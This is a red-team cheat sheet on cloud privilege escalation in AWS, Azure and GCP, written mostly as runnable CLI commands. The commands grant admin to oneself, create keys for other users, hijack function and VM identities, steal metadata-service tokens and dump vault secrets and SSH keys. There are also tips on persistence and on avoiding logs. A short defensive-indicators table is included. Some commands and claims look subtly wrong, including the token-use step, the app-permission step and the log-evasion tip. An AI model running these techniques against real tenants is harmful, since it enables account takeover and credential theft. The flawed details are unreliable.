---
icon: cloud
---

# Cloud PrivEsc

## **Cloud Privilege Escalation — Owning the Sky**

***

Compromising cloud credentials is just the beginning.\
Cloud privilege escalation transforms low-privilege API access into **root-equivalent control** by exploiting trust relationships, policy misconfigurations, and metadata exposures.

This guide walks through **AWS**, **Azure**, and **GCP** privilege escalation techniques used by advanced red teamers and CTF players alike.

***

### I. 🧩 Core Concepts

| Concept                  | Description                                     |
| ------------------------ | ----------------------------------------------- |
| **IAM Role**             | Defines permissions and trust relationships.    |
| **Policy Document**      | JSON structure granting actions to identities.  |
| **AssumeRole**           | AWS mechanism to impersonate another role.      |
| **Service Principal**    | App identity with delegated privileges (Azure). |
| **Service Account**      | GCP equivalent of a machine identity.           |
| **Privilege Escalation** | Gaining higher access than originally granted.  |

***

### II. ⚙️ AWS Privilege Escalation

#### 🧠 1. IAM Enumeration (Baseline)

```bash
aws sts get-caller-identity
aws iam list-roles
aws iam list-attached-user-policies --user-name <user>
```

#### ⚙️ 2. Check for `*` in Policies

```bash
aws iam list-policies --query "Policies[].PolicyName"
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

Look for:

```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

→ Full admin privileges.

***

#### 💣 3. Exploiting `iam:PassRole` + EC2

**Vulnerability:** User can create EC2 instance with a higher-privileged role.

```bash
aws iam list-roles | grep Admin
aws ec2 run-instances --image-id ami-1234 --iam-instance-profile Name=AdminRole
```

Result → shell access to instance with elevated privileges.

***

#### 🧩 4. Exploiting `iam:CreateAccessKey`

```bash
aws iam create-access-key --user-name admin-user
```

Generates permanent access credentials for escalation.

***

#### ⚙️ 5. Abusing `iam:AttachUserPolicy`

Attach `AdministratorAccess` to self:

```bash
aws iam attach-user-policy --user-name <your_user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

***

#### 💣 6. `sts:AssumeRole` Misconfigurations

```bash
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/AdminRole --role-session-name elevate
```

If the role trusts your account or the wildcard `Principal: *`, you escalate instantly.

***

#### 🧠 7. Lambda Function Role Hijack

If user can update Lambda code:

```bash
aws lambda update-function-code --function-name target-func --zip-file fileb://malicious.zip
```

Payload executes with the Lambda’s IAM role.

***

#### ⚙️ 8. EC2 Instance Profile Hijack

```bash
aws ec2 associate-iam-instance-profile --instance-id i-0123abcd --iam-instance-profile Name=AdminRole
```

Grants admin permissions via attached role.

***

#### 💣 9. CloudFormation Privilege Abuse

If allowed to create stacks:

```bash
aws cloudformation create-stack --stack-name escalator --template-body file://escalate.yml
```

Template includes resources with `AdministratorAccess`.

***

#### 🧠 10. Secrets & Token Harvesting

```bash
aws secretsmanager list-secrets
aws ssm get-parameter --name /prod/db/password --with-decryption
```

***

#### ⚙️ Tools for AWS PrivEsc

| Tool               | Use                                   |
| ------------------ | ------------------------------------- |
| **CloudGoat**      | AWS privilege escalation training lab |
| **Pacu**           | AWS exploitation framework            |
| **Enumerate-IAM**  | Detects privilege escalation paths    |
| **CloudSplaining** | Audits IAM policies for risk          |

***

### III. ⚙️ Azure Privilege Escalation

#### 🧠 1. Enumerate Permissions

```bash
az ad signed-in-user show
az role assignment list --all
az ad sp list
```

***

#### ⚙️ 2. Role Escalation via `User Access Administrator`

If assigned this role:

```bash
az role assignment create --assignee <your_id> --role "Owner"
```

***

#### 💣 3. Abusing Contributor Role

Contributor can **write** configurations, **deploy code**, and **create identities**, but not manage access.\
Use it to deploy a VM extension that runs arbitrary PowerShell:

```bash
az vm extension set --publisher Microsoft.Compute --name CustomScriptExtension --vm-name target --resource-group RG --settings '{"commandToExecute":"powershell -enc <payload>"}'
```

***

#### 🧩 4. Service Principal Takeover

If you can modify a service principal:

```bash
az ad sp update --id <object-id> --add passwordCredentials=@creds.json
```

→ Add your own password, authenticate as that service principal.

***

#### ⚙️ 5. Managed Identity Abuse

When an Azure VM exposes metadata:

```bash
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Use access token to impersonate identity:

```bash
export AZURE_ACCESS_TOKEN=<token>
az account set --access-token $AZURE_ACCESS_TOKEN
```

***

#### 💣 6. Azure Automation Account Privilege Escalation

Automation Accounts often run as system-managed identities.\
If you can edit runbooks:

```bash
az automation runbook update --automation-account-name target --name elevate --set runbookType=PowerShell
```

Run malicious script → executes as managed identity.

***

#### 🧠 7. Azure Key Vault Access

```bash
az keyvault secret list --vault-name targetvault
az keyvault secret show --name adminpassword --vault-name targetvault
```

→ Dump secrets directly from vault.

***

#### ⚙️ 8. App Registration PrivEsc

App registrations with `Application.ReadWrite.All` can modify permissions.\
Add “Owner” to yourself:

```bash
az ad app permission add --id <app-id> --api <api-id> --api-permissions Directory.ReadWrite.All=Role
```

***

#### 🧠 Azure PrivEsc Toolkit

| Tool             | Purpose                                               |
| ---------------- | ----------------------------------------------------- |
| **ROADTools**    | Enumerate and manipulate Azure AD                     |
| **StormSpotter** | Visualize relationships & attack paths                |
| **AzureHound**   | BloodHound for Azure                                  |
| **MicroBurst**   | PowerShell tool for Azure reconnaissance & escalation |

***

### IV. ⚙️ GCP Privilege Escalation

#### 🧠 1. Enumerate IAM Roles

```bash
gcloud projects get-iam-policy project-id
```

#### ⚙️ 2. Service Account Abuse

If you can impersonate another account:

```bash
gcloud auth print-access-token --impersonate-service-account admin@project.iam.gserviceaccount.com
```

***

#### 💣 3. Add Binding to Self

If you have `roles/resourcemanager.projectIamAdmin`:

```bash
gcloud projects add-iam-policy-binding project-id \
--member=user:you@example.com \
--role=roles/owner
```

***

#### 🧩 4. Cloud Functions & Run Exploitation

If allowed to deploy/update functions:

```bash
gcloud functions deploy evilfunc --runtime python39 --trigger-http --entry-point main --allow-unauthenticated
```

→ Execute arbitrary code as function’s service account.

***

#### ⚙️ 5. Metadata PrivEsc

From any GCP VM:

```bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

Use token to enumerate or act as the service account.

***

#### 💣 6. Storage & Key Leakage

```bash
gsutil ls gs://target-bucket
gsutil cat gs://target-bucket/.ssh/id_rsa
```

#### ⚙️ 7. IAM Rebinding

If you have editor privileges:

```bash
gcloud projects add-iam-policy-binding project-id \
--member=serviceAccount:you@project.iam.gserviceaccount.com \
--role=roles/owner
```

***

#### 🧠 GCP Escalation Tools

| Tool                   | Use                                            |
| ---------------------- | ---------------------------------------------- |
| **GCPBucketBrute**     | Discover open GCP buckets                      |
| **Cloud\_enum**        | Multi-cloud enumeration tool                   |
| **ScoutSuite**         | Audit permissions and exposures                |
| **GCP-IAM-PermFinder** | Identify misconfigurations and privilege paths |

***

### V. ⚙️ Cross-Cloud & Hybrid Privilege Chains

| Chain                                | Description                                                        |
| ------------------------------------ | ------------------------------------------------------------------ |
| **SSRF → Metadata → IAM Role Abuse** | Start with web vuln → extract token → assume admin role.           |
| **Exposed Keys → IAM Wildcard**      | Found key in repo → permissions allow policy edits → admin access. |
| **CI/CD Integration Leak**           | Jenkins/Azure DevOps tokens → cloud control.                       |
| **Multi-Cloud Trust Exploit**        | Azure app using AWS creds → cross-provider pivot.                  |

***

### VI. ⚙️ Cloud Privilege Escalation Indicators (Defensive Awareness)

| Indicator                                | Description                           |
| ---------------------------------------- | ------------------------------------- |
| Sudden policy version change             | New permissions added post-compromise |
| AssumeRole calls from new IPs            | Stolen credentials in use             |
| Lambda or Function code modified         | Execution hijack                      |
| Key Vault / Secrets Manager access spike | Credential theft in progress          |
| Creation of new access keys              | Persistence attempt                   |

***

### VII. ⚔️ Pro Tips & Red Team Tricks

✅ **Always Dump Policies**

```bash
aws iam get-user-policy --user-name user --policy-name inline
```

→ Inline policies often expose hidden paths.

✅ **Privilege Path Mapping**\
Use tools like `Pacu` or `AzureHound` to visualize what your user _can become_.

✅ **AssumeRole Enumeration**\
Enumerate all trust policies — if you can find a single wildcard trust, you own the account.

✅ **Pivot to Persistence**\
Once escalated → create your own keys, roles, or service principals to maintain access.

✅ **Defense Bypass**\
Use `--no-cli-pager` and quiet flags to minimize API log noise.

✅ **Automation**\
Use:

```bash
enumerate-iam --profile lowuser --scan-privesc
```

to auto-detect escalation vectors.

***

### VIII. ⚙️ Quick Reference Table

| Cloud     | Technique        | Command                                                        |
| --------- | ---------------- | -------------------------------------------------------------- |
| **AWS**   | PassRole → EC2   | `aws ec2 run-instances --iam-instance-profile Name=Admin`      |
|           | AssumeRole       | `aws sts assume-role --role-arn <arn>`                         |
|           | AttachPolicy     | `aws iam attach-user-policy`                                   |
| **Azure** | Role Escalation  | `az role assignment create`                                    |
|           | SPN Takeover     | `az ad sp update --add passwordCredentials`                    |
|           | Managed Identity | `curl 169.254.169.254/metadata/identity/oauth2/token`          |
| **GCP**   | IAM Bind         | `gcloud projects add-iam-policy-binding`                       |
|           | SA Impersonation | `gcloud auth print-access-token --impersonate-service-account` |

***
